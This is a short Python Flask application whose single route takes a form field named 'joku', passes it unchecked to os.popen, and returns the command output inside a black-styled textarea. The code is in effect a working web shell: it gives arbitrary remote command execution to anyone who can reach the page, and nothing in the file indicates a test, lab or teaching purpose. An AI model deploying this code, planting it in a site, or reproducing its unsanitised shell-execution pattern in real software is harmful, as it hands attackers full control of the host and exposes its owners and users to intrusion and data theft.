from flask import *
import os
import subprocess

app = Flask(__name__)



@app.route("/", methods=["POST", "GET"])
def home():
    if request.method == "POST":
        user = request.form["joku"]
        
        usr = user
        a = os.popen(usr).read()
        
        
        return render_template("index.html") + f"""

<label for="aimo">aimo:</label>

<textarea style="background-color: black;color:#fff;" id="aimo" name="aimo" rows="100" cols="100">
{a}

</textarea>
"""


    else:
        return render_template("index.html")






if __name__ == "__main__":
    app.run()
    
